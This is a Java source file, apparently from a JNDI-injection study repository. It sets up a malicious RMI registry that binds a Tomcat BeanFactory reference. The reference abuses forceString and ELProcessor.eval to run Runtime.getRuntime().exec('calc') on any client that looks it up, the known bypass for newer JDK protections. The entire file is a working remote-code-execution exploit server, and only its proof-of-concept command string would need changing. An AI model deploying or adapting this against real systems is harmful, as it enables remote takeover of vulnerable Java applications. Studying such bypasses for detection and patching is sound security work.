package com.yyjccc.jndi.JNDI.highbypass;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Tomcat8 {
	public static void main(String[] args) throws Exception {
		Registry registry = LocateRegistry.createRegistry(1099);
		ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
		resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
		resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
		ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
		registry.bind("Tomcat8bypass", referenceWrapper);
		System.out.println("Registry运行中......");

	}
}
